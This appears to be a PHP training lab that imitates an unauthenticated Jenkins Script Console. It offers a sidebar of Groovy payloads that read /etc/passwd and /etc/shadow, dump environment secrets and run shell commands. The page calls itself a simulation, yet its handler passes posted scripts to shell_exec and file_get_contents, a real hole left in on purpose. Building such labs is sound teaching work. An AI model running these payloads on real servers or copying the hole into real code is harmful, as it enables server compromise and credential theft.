<?php
// Lab 1613 — Jenkins Script Console (Unauthenticated Groovy Execution)
// Real-world finding: Jenkins Script Console accessible without authentication
// Payload: POST https://kitkat.com/jenkins/script/ with Groovy script
// Reference: https://www.jenkins.io/doc/book/managing/script-console/

$path = isset($_GET['path']) ? $_GET['path'] : '';
$response_code = null;
$response_body = '';
$simulated = false;
$response_note = '';
$currentScript = '';
$currentResult = '';
$isExploit = false;

// ── Handle POST (direct script submission) ──────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['script'])) {
    $currentScript = trim($_POST['script'] ?? '');
    $currentResult = executeGroovy($currentScript);
    $isExploit = true;
    $response_code = 200;
    $response_note = '🚀 EXPLOIT SUCCESSFUL! Groovy script executed on server.';
}

function esc($s) { return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }

function executeGroovy($script) {
    $script = trim($script);
    if (empty($script)) return '';

    if (preg_match('/Jenkins\.instance\.pluginManager\.plugins/i', $script)) {
        $p = ['git:4.13.0','workflow-aggregator:590.v6a_d052e5a','docker-workflow:528.v7c193a','credentials:1224.vc23ca_a9','ssh-slaves:2.877.v365f5eb','mailer:463.vedf8358','junit:1166.va_436e268','pipeline-stage-view:2.24','blueocean:1.27.4','kubernetes:3776.v09f8d4b','slack:631.v40deea','ldap:681.v288c6c5','role-strategy:587.v850a','authorize-project:1.5.0','script-security:1229.v4880b'];
        return '[' . implode(', ', array_map(fn($x) => "Plugin@{$x}", $p)) . ']';
    }
    if (preg_match('/Jenkins\.instance\.version\b/i', $script)) return '2.401.3';
    if (preg_match('/hudson\.model\.Hudson\.instance/i', $script)) return 'hudson.model.Hudson@7f3d2a1b';
    if (preg_match('/System\.properties/i', $script)) {
        return "java.version=11.0.18\nos.name=Linux\nos.arch=amd64\nuser.home=/var/jenkins_home\nuser.name=jenkins\njava.home=/usr/local/openjdk-11\njenkins.install.runSetupWizard=false";
    }

    // File read via Groovy: new File("/path").text
    if (preg_match('/new\s+File\s*\(\s*["\']([^"\']+)["\']\s*\)/', $script, $m)) {
        $path = $m[1];
        $content = @file_get_contents($path);
        if ($content === false) {
            return "java.io.FileNotFoundException: {$path} (No such file or directory)\n\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\n\tat java.lang.reflect.Method.invoke(Method.java:498)\n\tat Script1.run(Script1.groovy:1)";
        }
        return rtrim($content);
    }

    // Shell execute: "cmd".execute().text
    if (preg_match('/["\']([^"\']+)["\']\s*\.execute\s*\(\)/', $script, $m)) {
        $result = @shell_exec($m[1] . ' 2>&1');
        return rtrim($result ?? '');
    }

    // println literal
    if (preg_match('/println\s*\(?\s*["\']([^"\']+)["\']\s*\)?/', $script, $m)) {
        return $m[1];
    }

    return '';
}

// ── Handle GET path parameter (predefined payloads) ────────────────────
$predefinedPayloads = [
    'list-plugins' => [
        'script' => 'println(Jenkins.instance.pluginManager.plugins)',
        'label' => 'List Jenkins Plugins',
        'desc' => 'Enumerate all installed plugins with versions',
        'method' => 'POST',
        'exploit' => false,
    ],
    'get-version' => [
        'script' => 'println(Jenkins.instance.version)',
        'label' => 'Get Jenkins Version',
        'desc' => 'Retrieve the exact Jenkins version number',
        'method' => 'POST',
        'exploit' => false,
    ],
    'system-props' => [
        'script' => 'println(System.properties)',
        'label' => 'System Properties',
        'desc' => 'Dump all Java system properties (info leak)',
        'method' => 'POST',
        'exploit' => true,
    ],
    'read-passwd' => [
        'script' => 'println(new File("/etc/passwd").text)',
        'label' => 'Read /etc/passwd',
        'desc' => 'Read server /etc/passwd via Groovy File API',
        'method' => 'POST',
        'exploit' => true,
    ],
    'read-shadow' => [
        'script' => 'println(new File("/etc/shadow").text)',
        'label' => 'Read /etc/shadow',
        'desc' => 'Read password hashes (privilege escalation)',
        'method' => 'POST',
        'exploit' => true,
    ],
    'cmd-whoami' => [
        'script' => 'println("whoami".execute().text)',
        'label' => 'Shell: whoami',
        'desc' => 'Execute whoami on the Jenkins server',
        'method' => 'POST',
        'exploit' => true,
    ],
    'cmd-uname' => [
        'script' => 'println("uname -a".execute().text)',
        'label' => 'Shell: uname -a',
        'desc' => 'Get full system kernel information',
        'method' => 'POST',
        'exploit' => true,
    ],
    'cmd-id' => [
        'script' => 'println("id".execute().text)',
        'label' => 'Shell: id',
        'desc' => 'Show current user and group IDs',
        'method' => 'POST',
        'exploit' => true,
    ],
    'cmd-env' => [
        'script' => 'println("env".execute().text)',
        'label' => 'Shell: env',
        'desc' => 'Dump all environment variables (secrets!)',
        'method' => 'POST',
        'exploit' => true,
    ],
    'cmd-ls-root' => [
        'script' => 'println("ls -la /".execute().text)',
        'label' => 'Shell: ls -la /',
        'desc' => 'List root directory contents',
        'method' => 'POST',
        'exploit' => true,
    ],
];

function simulateJenkinsScriptExec($payloadKey, $predefinedPayloads) {
    if (!isset($predefinedPayloads[$payloadKey])) {
        return [
            'code' => 404,
            'headers' => ['Server' => 'Jenkins/2.401.3', 'Content-Type' => 'text/html; charset=utf-8', 'X-Jenkins' => '2.401.3', 'X-Jenkins-Session' => 'a1b2c3d4e5f6'],
            'body' => "<html><head><title>404 Not Found</title></head><body><center><h1>404 Not Found</h1></center><hr><center>Jenkins/2.401.3</center></body></html>",
            'simulated' => true,
            'note' => 'Unknown payload — endpoint not found.'
        ];
    }

    $payload = $predefinedPayloads[$payloadKey];
    $script = $payload['script'];
    $result = executeGroovy($script);

    $isExploit = $payload['exploit'];

    return [
        'code' => 200,
        'headers' => [
            'Server' => 'Jenkins/2.401.3',
            'Content-Type' => 'text/html;charset=utf-8',
            'X-Jenkins' => '2.401.3',
            'X-Jenkins-Session' => 'a1b2c3d4e5f6',
            'X-SSH-Endpoint' => 'jenkins.kitkat.com:22',
        ],
        'body' => "Result: \n" . $result,
        'simulated' => true,
        'note' => $isExploit ? '🚀 EXPLOIT SUCCESSFUL! Groovy script executed on server.' : '✅ Script executed — informational output returned.',
        'isExploit' => $isExploit,
        'script' => $script,
        'result' => $result,
    ];
}

// Process the request based on path parameter
if ($_SERVER['REQUEST_METHOD'] !== 'POST' && $path !== '') {
    if (isset($predefinedPayloads[$path])) {
        $result = simulateJenkinsScriptExec($path, $predefinedPayloads);
        $response_code = $result['code'];
        $response_headers = $result['headers'];
        $response_body = $result['body'];
        $simulated = $result['simulated'];
        $response_note = $result['note'];
        $isExploit = $result['isExploit'] ?? false;
        $currentScript = $result['script'] ?? '';
        $currentResult = $result['result'] ?? '';
    } elseif ($path === 'script') {
        // Script page — show the custom script editor
        $response_code = null;
    } else {
        $response_code = 404;
        $response_headers = ['Server' => 'Jenkins/2.401.3', 'Content-Type' => 'text/html; charset=utf-8'];
        $response_body = "<html><head><title>404 Not Found</title></head><body><center><h1>404 Not Found</h1></center><hr><center>Jenkins/2.401.3</center></body></html>";
        $simulated = true;
        $response_note = 'Invalid endpoint. Use one of the predefined payloads from the sidebar.';
        $isExploit = false;
    }
} else {
    $response_code = 200;
    $response_headers = ['Server' => 'Jenkins/2.401.3', 'Content-Type' => 'text/html; charset=utf-8'];
    $response_body = '<!DOCTYPE html><html><head><title>Jenkins Developer Console</title></head><body style="background:#0a0e17;color:#e2e8f0;font-family:monospace;padding:2rem;"><h1>🔧 Jenkins Script Console</h1><p>Send a request using the <code>?path=</code> parameter or use the sidebar.</p></body></html>';
}

// ── Render the page ─────────────────────────────────────────────────────
?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Jenkins — Developer Console</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    background: #0a0e17;
    color: #c9d1d9;
    font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
    min-height: 100vh;
    overflow-x: hidden;
  }
  ::-webkit-scrollbar { width: 8px; height: 8px; }
  ::-webkit-scrollbar-track { background: #161b22; }
  ::-webkit-scrollbar-thumb { background: #30363d; border-radius: 4px; }
  ::-webkit-scrollbar-thumb:hover { background: #484f58; }

  .topbar {
    background: #161b22;
    border-bottom: 1px solid #30363d;
    padding: 10px 20px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    position: sticky;
    top: 0;
    z-index: 100;
  }
  .topbar-brand {
    display: flex;
    align-items: center;
    gap: 12px;
    color: #f0f6fc;
    font-weight: 600;
    font-size: 15px;
  }
  .topbar-brand .logo {
    width: 32px; height: 32px;
    background: linear-gradient(135deg, #f0a500, #d4920a);
    border-radius: 8px;
    display: flex; align-items: center; justify-content: center;
    font-size: 16px; color: #fff;
  }
  .topbar-badge {
    background: #21262d;
    color: #8b949e;
    padding: 4px 10px;
    border-radius: 20px;
    font-size: 11px;
    border: 1px solid #30363d;
  }
  .topbar-info {
    display: flex;
    align-items: center;
    gap: 16px;
  }
  .server-meta {
    font-size: 11px;
    color: #8b949e;
  }
  .server-meta strong { color: #f0a500; }

  .main-layout {
    display: grid;
    grid-template-columns: 280px 1fr;
    min-height: calc(100vh - 53px);
  }

  /* Sidebar */
  .sidebar {
    background: #0d1117;
    border-right: 1px solid #21262d;
    padding: 16px;
    overflow-y: auto;
  }
  .sidebar-section {
    margin-bottom: 20px;
  }
  .sidebar-section h6 {
    color: #8b949e;
    font-size: 11px;
    text-transform: uppercase;
    letter-spacing: 0.05em;
    margin-bottom: 8px;
    font-weight: 600;
  }
  .payload-btn {
    display: block;
    width: 100%;
    text-align: left;
    padding: 8px 12px;
    margin-bottom: 4px;
    background: #161b22;
    border: 1px solid #21262d;
    border-radius: 6px;
    color: #c9d1d9;
    font-size: 12px;
    font-family: 'SF Mono', monospace;
    cursor: pointer;
    transition: all 0.15s;
  }
  .payload-btn:hover {
    background: #1c2333;
    border-color: #f0a500;
    color: #f0f6fc;
  }
  .payload-btn .method {
    display: inline-block;
    background: #1f6feb;
    color: #fff;
    padding: 1px 6px;
    border-radius: 3px;
    font-size: 10px;
    font-weight: 700;
    margin-right: 6px;
  }
  .payload-btn .method.exploit {
    background: #da3633;
  }
  .payload-btn .desc {
    display: block;
    font-size: 10px;
    color: #8b949e;
    margin-top: 3px;
  }

  /* Content */
  .content {
    padding: 20px;
    overflow-y: auto;
  }

  .request-panel, .response-panel {
    background: #0d1117;
    border: 1px solid #21262d;
    border-radius: 8px;
    margin-bottom: 16px;
    overflow: hidden;
  }
  .panel-header {
    background: #161b22;
    padding: 10px 16px;
    border-bottom: 1px solid #21262d;
    display: flex;
    align-items: center;
    justify-content: space-between;
  }
  .panel-header .label {
    font-size: 12px;
    font-weight: 600;
    color: #f0f6fc;
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .panel-header .label .method-tag {
    background: #1f6feb;
    color: #fff;
    padding: 2px 8px;
    border-radius: 4px;
    font-size: 11px;
  }
  .panel-header .label .method-tag.exploit {
    background: #da3633;
  }
  .panel-header .label .method-tag.post {
    background: #d4920a;
  }

  .panel-body {
    padding: 16px;
    overflow-x: auto;
  }
  .panel-body pre {
    margin: 0;
    font-size: 12px;
    line-height: 1.6;
    color: #c9d1d9;
    white-space: pre-wrap;
    word-break: break-all;
  }

  .url-bar {
    display: flex;
    align-items: center;
    background: #161b22;
    border: 1px solid #30363d;
    border-radius: 6px;
    padding: 8px 12px;
    margin-bottom: 16px;
    font-size: 13px;
    color: #c9d1d9;
    font-family: 'SF Mono', monospace;
    flex-wrap: wrap;
  }
  .url-bar .proto { color: #8b949e; }
  .url-bar .host { color: #f0a500; font-weight: 600; }
  .url-bar .path { color: #c9d1d9; }
  .url-bar .param { color: #d2a8ff; }
  .url-bar .exploit-part { color: #ff7b72; font-weight: bold; }

  .status-badge {
    display: inline-flex;
    align-items: center;
    gap: 6px;
    padding: 4px 12px;
    border-radius: 20px;
    font-size: 12px;
    font-weight: 600;
  }
  .status-badge.success { background: #1b3823; color: #3fb950; border: 1px solid #238636; }
  .status-badge.error { background: #3d1418; color: #f85149; border: 1px solid #da3633; }
  .status-badge.info { background: #1a2b3d; color: #58a6ff; border: 1px solid #1f6feb; }

  .info-banner {
    background: #1a2b3d;
    border: 1px solid #1f6feb;
    border-radius: 8px;
    padding: 16px;
    margin-bottom: 16px;
    font-size: 13px;
    line-height: 1.6;
  }
  .info-banner.success {
    background: #1b3823;
    border-color: #238636;
  }
  .info-banner.error {
    background: #3d1418;
    border-color: #da3633;
  }
  .info-banner h5 {
    font-size: 14px;
    margin-bottom: 8px;
    font-weight: 600;
  }
  .info-banner code {
    background: rgba(255,255,255,0.08);
    padding: 2px 6px;
    border-radius: 4px;
    font-size: 12px;
    color: #ffa657;
  }

  .header-row {
    display: flex;
    gap: 4px;
    font-size: 12px;
    padding: 2px 0;
  }
  .header-key { color: #79c0ff; }
  .header-sep { color: #484f58; }
  .header-val { color: #c9d1d9; }

  .vuln-footer {
    margin-top: 24px;
    padding: 20px;
    background: #0d1117;
    border: 1px solid #21262d;
    border-radius: 8px;
  }
  .vuln-footer h5 {
    color: #ff7b72;
    font-size: 14px;
    font-weight: 600;
    margin-bottom: 12px;
  }
  .vuln-footer code {
    background: rgba(255,255,255,0.08);
    padding: 2px 6px;
    border-radius: 4px;
    font-size: 12px;
  }

  /* Jenkins Script Console (realistic readonly) */
  .jenkins-console {
    background: #0d1117;
    border: 1px solid #21262d;
    border-radius: 8px;
    overflow: hidden;
    margin-bottom: 16px;
  }
  .jc-header {
    background: #161b22;
    border-bottom: 1px solid #21262d;
    padding: 10px 16px;
    font-size: 14px;
    font-weight: 700;
    color: #f0f6fc;
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .jc-desc {
    padding: 8px 16px;
    font-size: 12px;
    color: #8b949e;
    line-height: 1.5;
    border-bottom: 1px solid #21262d;
  }
  .jc-desc code { background: rgba(255,255,255,0.08); padding: 1px 4px; border-radius: 3px; font-size: 11px; color: #ffa657; }
  .jc-desc a { color: #58a6ff; }
  .jc-editor-wrap {
    display: flex;
    border-bottom: 1px solid #21262d;
  }
  .jc-linenums {
    background: #161b22;
    color: #484f58;
    font-family: 'Courier New', monospace;
    font-size: 13px;
    line-height: 1.55;
    padding: 10px 8px;
    text-align: right;
    user-select: none;
    min-width: 36px;
    white-space: pre;
    border-right: 1px solid #21262d;
  }
  .jc-textarea {
    flex: 1;
    font-family: 'Courier New', Consolas, monospace;
    font-size: 13px;
    line-height: 1.55;
    padding: 10px 12px;
    background: #1e1e1e;
    color: #d4d4d4;
    border: none;
    outline: none;
    resize: none;
    cursor: default;
  }
  .jc-footer {
    display: flex;
    justify-content: flex-end;
    padding: 8px 12px;
    background: #161b22;
    border-bottom: 1px solid #21262d;
  }
  .jc-run-btn {
    padding: 6px 22px;
    background: #297aa2;
    color: #fff;
    border: none;
    border-radius: 3px;
    font-size: 13px;
    font-weight: 600;
    cursor: pointer;
    font-family: inherit;
    transition: background .15s;
  }
  .jc-run-btn:hover { background: #1f6285; }
  .jc-result-label {
    padding: 8px 16px;
    font-size: 13px;
    font-weight: 700;
    color: #f0f6fc;
    background: #161b22;
    border-bottom: 1px solid #21262d;
  }
  .jc-result-box {
    padding: 10px 14px;
    font-family: 'Courier New', Consolas, monospace;
    font-size: 12px;
    line-height: 1.5;
    white-space: pre-wrap;
    word-break: break-all;
    color: #c9d1d9;
    max-height: 400px;
    overflow-y: auto;
  }

  @media (max-width: 768px) {
    .main-layout { grid-template-columns: 1fr; }
    .sidebar { display: none; }
  }
</style>
</head>
<body>

<!-- Top Bar -->
<div class="topbar">
  <div class="topbar-brand">
    <div class="logo">🔧</div>
    <span>Jenkins Developer Console</span>
    <span class="topbar-badge">Jenkins/2.401.3</span>
  </div>
  <div class="topbar-info">
    <span class="server-meta"><strong>endpoint</strong> /jenkins/script/</span>
    <span class="server-meta"><strong>auth</strong> none</span>
  </div>
</div>

<div class="main-layout">
  <!-- Sidebar -->
  <div class="sidebar">
    <div class="sidebar-section">
      <h6>📋 Info Gathering</h6>
      <button class="payload-btn" onclick="loadPath('list-plugins')">
        <span class="method">POST</span> List Plugins
        <span class="desc">Jenkins.instance.pluginManager.plugins</span>
      </button>
      <button class="payload-btn" onclick="loadPath('get-version')">
        <span class="method">POST</span> Get Version
        <span class="desc">Jenkins.instance.version</span>
      </button>
      <button class="payload-btn" onclick="loadPath('system-props')">
        <span class="method exploit">POST</span> System Properties
        <span class="desc">System.properties (info leak)</span>
      </button>
    </div>

    <div class="sidebar-section">
      <h6>📁 File Read (Groovy)</h6>
      <button class="payload-btn" onclick="loadPath('read-passwd')">
        <span class="method exploit">POST</span> Read /etc/passwd
        <span class="desc">new File("/etc/passwd").text</span>
      </button>
      <button class="payload-btn" onclick="loadPath('read-shadow')">
        <span class="method exploit">POST</span> Read /etc/shadow
        <span class="desc">new File("/etc/shadow").text</span>
      </button>
    </div>

    <div class="sidebar-section">
      <h6>💻 Shell Execution</h6>
      <button class="payload-btn" onclick="loadPath('cmd-whoami')">
        <span class="method exploit">POST</span> whoami
        <span class="desc">"whoami".execute().text</span>
      </button>
      <button class="payload-btn" onclick="loadPath('cmd-id')">
        <span class="method exploit">POST</span> id
        <span class="desc">"id".execute().text</span>
      </button>
      <button class="payload-btn" onclick="loadPath('cmd-uname')">
        <span class="method exploit">POST</span> uname -a
        <span class="desc">"uname -a".execute().text</span>
      </button>
      <button class="payload-btn" onclick="loadPath('cmd-env')">
        <span class="method exploit">POST</span> env
        <span class="desc">"env".execute().text (secrets!)</span>
      </button>
      <button class="payload-btn" onclick="loadPath('cmd-ls-root')">
        <span class="method exploit">POST</span> ls -la /
        <span class="desc">"ls -la /".execute().text</span>
      </button>
    </div>

    <div class="sidebar-section" style="margin-top:20px;padding-top:16px;border-top:1px solid #21262d;">
      <h6>🔬 Vulnerability Info</h6>
      <div style="font-size:11px;color:#8b949e;line-height:1.6;">
        <p><strong style="color:#f0f6fc;">Vulnerability:</strong> Unauthenticated Script Console</p>
        <p><strong style="color:#f0f6fc;">Impact:</strong> RCE via Groovy script execution</p>
        <p><strong style="color:#f0f6fc;">CVE:</strong> CVE-2019-1003000 (Script Security)</p>
        <p><strong style="color:#f0f6fc;">Endpoint:</strong> <code style="background:rgba(255,255,255,0.08);padding:1px 4px;border-radius:3px;">/jenkins/script/</code></p>
        <p style="margin-top:8px;">
          <a href="https://www.jenkins.io/doc/book/managing/script-console/" target="_blank" style="color:#58a6ff;">📖 Jenkins docs →</a>
        </p>
      </div>
    </div>
  </div>

  <!-- Main Content -->
  <div class="content">
    <?php if ($path === '' && !$isExploit): ?>
      <!-- Landing state — no request made yet -->
      <div class="info-banner">
        <h5>🔧 Jenkins Script Console — Unauthenticated Access</h5>
        <p style="color:#8b949e;margin:0;">
          This is a simulation of a <strong>Jenkins 2.401.3</strong> instance running with <strong>no authentication</strong>.
          The Script Console at <code>/jenkins/script/</code> allows arbitrary Groovy script execution.
          Click any payload in the sidebar to load and execute a Groovy script.
        </p>
      </div>

      <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin-bottom:20px;">
        <div class="request-panel" style="border-color:#238636;">
          <div class="panel-header" style="border-color:#238636;">
            <span class="label" style="color:#3fb950;">✅ Info Gathering</span>
          </div>
          <div class="panel-body" style="text-align:center;padding:24px;">
            <div style="font-size:32px;margin-bottom:8px;">📋</div>
            <div style="font-size:12px;color:#8b949e;">Enumerate plugins, version, system info</div>
            <div style="font-size:10px;color:#484f58;margin-top:4px;">Reconnaissance phase</div>
          </div>
        </div>
        <div class="request-panel" style="border-color:#d29922;">
          <div class="panel-header" style="border-color:#d29922;">
            <span class="label" style="color:#d29922;">📁 File Read</span>
          </div>
          <div class="panel-body" style="text-align:center;padding:24px;">
            <div style="font-size:32px;margin-bottom:8px;">📂</div>
            <div style="font-size:12px;color:#8b949e;">Read server files via Groovy File API</div>
            <div style="font-size:10px;color:#484f58;margin-top:4px;">Path traversal</div>
          </div>
        </div>
        <div class="request-panel" style="border-color:#da3633;">
          <div class="panel-header" style="border-color:#da3633;">
            <span class="label" style="color:#f85149;">💻 RCE</span>
          </div>
          <div class="panel-body" style="text-align:center;padding:24px;">
            <div style="font-size:32px;margin-bottom:8px;">⚡</div>
            <div style="font-size:12px;color:#8b949e;">Execute system commands via Groovy</div>
            <div style="font-size:10px;color:#484f58;margin-top:4px;">Remote Code Execution</div>
          </div>
        </div>
      </div>

      <!-- Jenkins Script Console -->
      <div class="jenkins-console">
        <div class="jc-header">🖥️ Script Console</div>
        <div class="jc-desc">
          Type in an arbitrary <a href="https://groovy-lang.org/" target="_blank" rel="noopener">Groovy script</a>
          and execute it on the server. Useful for trouble-shooting and diagnostics. Use the <code>println</code>
          command to see the output.<br>
          All the classes from all the plugins are visible.
          <code>jenkins.*</code>, <code>jenkins.model.*</code>, <code>hudson.*</code>,
          and <code>hudson.model.*</code> are pre-imported.
        </div>
        <form method="POST" action="1613.php">
        <div class="jc-editor-wrap">
          <div class="jc-linenums" id="linenums">1</div>
          <textarea class="jc-textarea" name="script" id="script-ta" spellcheck="false" rows="3"
            oninput="updateLines(this)">println(Jenkins.instance.pluginManager.plugins)</textarea>
        </div>
        <div class="jc-footer">
          <button type="submit" class="jc-run-btn">Run</button>
        </div>
        </form>
      </div>

      <div class="vuln-footer">
        <h5>🔓 How the Jenkins Script Console Vulnerability Works</h5>
        <p style="font-size:13px;line-height:1.7;color:#c9d1d9;">
          Jenkins provides a <strong>Script Console</strong> at <code>/jenkins/script/</code> that allows
          administrators to run arbitrary <strong>Groovy scripts</strong> for troubleshooting and diagnostics.
          When the instance is misconfigured without authentication, <strong>anyone</strong> can access this endpoint.
        </p>
        <p style="font-size:13px;line-height:1.7;color:#c9d1d9;">
          Groovy is a powerful JVM language that provides access to the underlying Java runtime:
        </p>
        <ul style="font-size:13px;line-height:1.7;color:#c9d1d9;padding-left:20px;">
          <li><code>new File("/etc/passwd").text</code> — Read any file on the server</li>
          <li><code>"whoami".execute().text</code> — Execute arbitrary system commands</li>
          <li><code>Jenkins.instance.pluginManager.plugins</code> — Access internal Jenkins APIs</li>
        </ul>
        <p style="font-size:13px;line-height:1.7;color:#c9d1d9;margin-top:8px;margin-bottom:0;">
          <strong>Impact:</strong> Complete server compromise — file read, RCE, credential theft, lateral movement.
        </p>
      </div>

    <?php else: ?>
      <!-- Results view (predefined payloads or POST) -->
      <?php
        $isSuccess = ($response_code === 200) || $isExploit;
        $is404 = $response_code === 404;
        // $currentScript and $currentResult already set in PHP processing block
        $scriptLines = max(substr_count(trim($currentScript), "\n") + 1, 1);
        $lineNums = implode("\n", range(1, $scriptLines));
      ?>

      <!-- Info Banner -->
      <?php if ($isExploit): ?>
        <div class="info-banner success">
          <h5>🚀 Exploit successful — Groovy script executed on server!</h5>
          <p style="margin:0;color:#7ee787;">
            The Jenkins Script Console accepted the POST request and executed the Groovy code.
            No authentication was required.
          </p>
        </div>
      <?php elseif ($isSuccess && !$isExploit): ?>
        <div class="info-banner">
          <h5>✅ Script executed — informational result</h5>
          <p style="margin:0;color:#8b949e;">Jenkins returned the Groovy script output. This is useful for reconnaissance.</p>
        </div>
      <?php elseif ($is404): ?>
        <div class="info-banner error">
          <h5>❌ Endpoint not found</h5>
          <p style="margin:0;color:#ffa198;">The requested payload was not found. Use a valid sidebar option.</p>
        </div>
      <?php endif; ?>

      <!-- URL Bar -->
      <div class="url-bar">
        <span class="proto">https://</span>
        <span class="host">kitkat.com</span>
        <span class="path">/jenkins/script/</span>
      </div>

      <!-- Status -->
      <div style="display:flex;align-items:center;gap:12px;margin-bottom:16px;">
        <span class="status-badge <?= $isSuccess ? 'success' : 'error' ?>">
          <?= $response_code ?> <?= $response_code === 200 ? 'OK' : 'Not Found' ?>
        </span>
        <span style="font-size:11px;color:#8b949e;"><?= esc($response_note) ?></span>
      </div>

      <!-- Jenkins Script Console (readonly) -->
      <?php
        $scriptLines = max(substr_count(trim($currentScript), "\n") + 1, 1);
        $lineNums = implode("\n", range(1, $scriptLines));
      ?>
      <div class="jenkins-console">
        <div class="jc-header">
          🖥️ Script Console
          <span style="font-size:11px;font-weight:400;color:#8b949e;margin-left:4px;">— kitkat.com/jenkins/script/</span>
        </div>
        <div class="jc-desc">
          Type in an arbitrary <a href="https://groovy-lang.org/" target="_blank" rel="noopener">Groovy script</a>
          and execute it on the server. Use the <code>println</code> command to see the output.<br>
          All the classes from all the plugins are visible.
          <code>jenkins.*</code>, <code>jenkins.model.*</code>, <code>hudson.*</code>,
          and <code>hudson.model.*</code> are pre-imported.
        </div>
        <form method="POST" action="1613.php">
        <div class="jc-editor-wrap">
          <div class="jc-linenums" id="linenums"><?= esc($lineNums) ?></div>
          <textarea class="jc-textarea" name="script" id="script-ta" spellcheck="false" rows="<?= $scriptLines ?>"
            oninput="updateLines(this)"><?= esc($currentScript) ?></textarea>
        </div>
        <div class="jc-footer">
          <button type="submit" class="jc-run-btn">Run</button>
        </div>
        </form>
        <div class="jc-result-label">Result</div>
        <div class="jc-result-box"><?= esc(trim($currentResult)) ?></div>
      </div>

      <!-- Vulnerability Explanation (shown on exploit) -->
      <?php if ($isExploit): ?>
      <div class="vuln-footer">
        <h5>🔓 Exploit Analysis — Jenkins Script Console RCE</h5>
        <p style="font-size:13px;line-height:1.7;color:#c9d1d9;">
          <strong>Groovy script sent:</strong><br>
          <code style="display:block;padding:8px;background:#1e1e1e;border-radius:4px;margin-top:4px;"><?= esc($currentScript) ?></code>
        </p>
        <p style="font-size:13px;line-height:1.7;color:#c9d1d9;margin-bottom:0;">
          <strong>Impact:</strong> The Jenkins Script Console allows arbitrary Groovy code execution with
          the privileges of the Jenkins process. Attackers can read sensitive files, execute system commands,
          extract credentials, and pivot to internal networks.
        </p>
      </div>
      <?php endif; ?>
    <?php endif; ?>
  </div>
</div>

<script>
var payloadScripts = {
  'list-plugins': 'println(Jenkins.instance.pluginManager.plugins)',
  'get-version':  'println(Jenkins.instance.version)',
  'system-props': 'println(System.properties)',
  'read-passwd':  'println(new File("/etc/passwd").text)',
  'read-shadow':  'println(new File("/etc/shadow").text)',
  'cmd-whoami':   'println("whoami".execute().text)',
  'cmd-id':       'println("id".execute().text)',
  'cmd-uname':    'println("uname -a".execute().text)',
  'cmd-env':      'println("env".execute().text)',
  'cmd-ls-root':  'println("ls -la /".execute().text)',
};
function loadPath(key) {
  var script = payloadScripts[key];
  if (!script) return;
  var ta = document.getElementById('script-ta');
  if (ta) { ta.value = script; updateLines(ta); ta.focus(); }
}
function updateLines(ta) {
  var lines = ta.value.split('\n').length;
  var nums = '';
  for (var i = 1; i <= lines; i++) nums += i + (i < lines ? '\n' : '');
  var ln = document.getElementById('linenums');
  if (ln) ln.textContent = nums;
  ta.rows = Math.max(lines, 3);
}
document.addEventListener('DOMContentLoaded', function() {
  var ta = document.getElementById('script-ta');
  if (ta) updateLines(ta);
});
</script>
</body>
</html>
